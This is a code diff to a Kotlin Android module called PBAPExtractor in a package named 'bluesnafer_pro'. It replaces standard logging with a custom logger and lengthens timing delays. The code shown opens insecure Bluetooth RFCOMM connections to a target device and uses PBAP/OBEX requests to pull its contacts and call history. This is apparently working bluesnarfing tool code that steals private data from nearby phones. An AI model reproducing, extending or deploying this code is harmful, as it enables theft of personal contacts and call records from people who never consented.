@@ -1,7 +1,6 @@
 package com.bluesnafer_pro
 
 import android.bluetooth.*
-import android.util.Log
 import java.io.*
 import java.util.*
 import java.util.concurrent.Executors
@@ -18,13 +17,13 @@ object PBAPExtractor {
      * Extract contacts from device
      */
     fun extractContacts(device: BluetoothDevice): List<Map<String, String>> {
-        Log.d(TAG, "Extracting contacts from ${device.address}")
+        BluesnaferLogger.d(TAG, "Extracting contacts from ${device.address}")
         val contacts = mutableListOf<Map<String, String>>()
         
         return try {
             val socket = device.createInsecureRfcommSocketToServiceRecord(PBAP_UUID)
             socket.connect()
-            Log.d(TAG, "PBAP connected for contacts")
+            BluesnaferLogger.d(TAG, "PBAP connected for contacts")
             
             val input = socket.inputStream
             val output = socket.outputStream
@@ -42,13 +41,13 @@ object PBAPExtractor {
             
             output.write(connectPacket)
             output.flush()
-            Thread.sleep(200)
+            Thread.sleep(2000)
             
             val connectResponse = ByteArray(1024)
             val connBytes = input.read(connectResponse)
             
             if (connBytes > 0 && (connectResponse[0].toInt() and 0xFF) == 0xA0) {
-                Log.d(TAG, "PBAP connected successfully")
+                BluesnaferLogger.d(TAG, "PBAP connected successfully")
                 
                 // Request contact list (vCard 2.1 format)
                 val pullVcardListing = byteArrayOf(
@@ -61,14 +60,14 @@ object PBAPExtractor {
                 
                 output.write(pullVcardListing)
                 output.flush()
-                Thread.sleep(300)
+                Thread.sleep(3000)
                 
                 val listingResponse = ByteArray(8192)
                 val listBytes = input.read(listingResponse)
                 
                 if (listBytes > 0) {
                     val vcardData = String(listingResponse, 0, listBytes, Charsets.UTF_8)
-                    Log.d(TAG, "Received ${listBytes} bytes of vCard data")
+                    BluesnaferLogger.d(TAG, "Received ${listBytes} bytes of vCard data")
                     
                     // Parse vCard entries
                     val lines = vcardData.split("\n")
@@ -105,10 +104,10 @@ object PBAPExtractor {
             }
             
             socket.close()
-            Log.d(TAG, "Extracted ${contacts.size} contacts")
+            BluesnaferLogger.d(TAG, "Extracted ${contacts.size} contacts")
             contacts
         } catch (e: Exception) {
-            Log.e(TAG, "PBAP contacts error: ${e.message}")
+            BluesnaferLogger.e(TAG, "PBAP contacts error: ${e.message}")
             emptyList()
         }
     }
@@ -117,7 +116,7 @@ object PBAPExtractor {
      * Extract call history from device
      */
     fun extractCallHistory(device: BluetoothDevice): List<Map<String, Any>> {
-        Log.d(TAG, "Extracting call history from ${device.address}")
+        BluesnaferLogger.d(TAG, "Extracting call history from ${device.address}")
         val calls = mutableListOf<Map<String, Any>>()
         
         return try {
@@ -169,10 +168,10 @@ object PBAPExtractor {
             }
             
             socket.close()
-            Log.d(TAG, "Extracted ${calls.size} call records")
+            BluesnaferLogger.d(TAG, "Extracted ${calls.size} call records")
             calls
         } catch (e: Exception) {
-            Log.e(TAG, "PBAP call history error: ${e.message}")
+            BluesnaferLogger.e(TAG, "PBAP call history error: ${e.message}")
             emptyList()
         }
     }
@@ -181,7 +180,7 @@ object PBAPExtractor {
      * Extract by type - wrapper method
      */
     fun extract(device: BluetoothDevice, type: String): Map<String, Any> {
-        Log.d(TAG, "Extracting: $type")
+        BluesnaferLogger.d(TAG, "Extracting: $type")
         return when (type.lowercase()) {
             "contacts" -> {
                 val contacts = extractContacts(device)
